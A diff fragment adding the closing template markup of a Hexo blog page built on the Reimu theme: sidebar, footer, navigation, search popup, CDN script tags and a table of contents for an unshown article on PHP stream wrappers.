+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        John Doe
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          3.4k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          00:13
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text">PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text">file:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-bzip2-zlib-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.</span> <span class="toc-text">zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">data:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-https-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.5.</span> <span class="toc-text">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;  协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">phar:&#x2F;&#x2F;  协议</span></a></li></ol></li></ol></div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
